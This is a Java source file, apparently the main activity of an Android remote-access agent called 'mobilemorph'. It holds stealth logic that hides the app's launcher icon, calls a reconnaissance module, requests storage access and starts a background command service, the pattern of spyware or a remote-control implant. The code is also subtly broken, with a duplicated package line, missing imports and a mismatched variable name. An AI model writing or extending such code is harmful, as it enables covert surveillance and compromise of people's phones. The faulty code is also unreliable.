package com.mobilemorph.agent;
package com.mobilemorph.agent;
import com.mobilemorph.agent.ReconModule;
import android.app.Activity;
import android.content.ComponentName;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.Manifest;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

public class MainActivity extends Activity {
    private static final int REQUEST_PERMISSIONS = 100;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        SharedPreferences pref = getSharedPreferences("agent", MODE_PRIVATE);
        boolean stealth = prefs.getBoolean("stealth_mode", false);
        if (stealth) {
            hideLauncherIcon();
            finish(); // close the activity immediately (stealth mode)
        }
        ReconModule.runRecon(this);
        requestRuntimePermissions();
        checkForUpdate(this);
    }

    private void requestRuntimePermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE)
                    != PackageManager.PERMISSION_GRANTED) {
                ActivityCompat.requestPermissions(this,
                        new String[]{Manifest.permission.READ_EXTERNAL_STORAGE},
                        REQUEST_PERMISSIONS);
            }
        }
        else {
            Intent serviceIntent = new Intent(this, CommandService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent);
            } else {
                startService(serviceIntent);
            }
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQUEST_PERMISSIONS) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                Intent serviceIntent = new Intent(this, CommandService.class);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    startForegroundService(serviceIntent);
                } else {
                    startService(serviceIntent);
                }
            }
        }
    }

    private void hideLauncherIcon() {
        new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {
                PackageManager p = getPackageManager();
                ComponentName componentName = new ComponentName(MainActivity.this, MainActivity.class);
                p.setComponentEnabledSetting(componentName,
                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                        PackageManager.DONT_KILL_APP);
            }
        }, 1000); // delay optional
    }
}
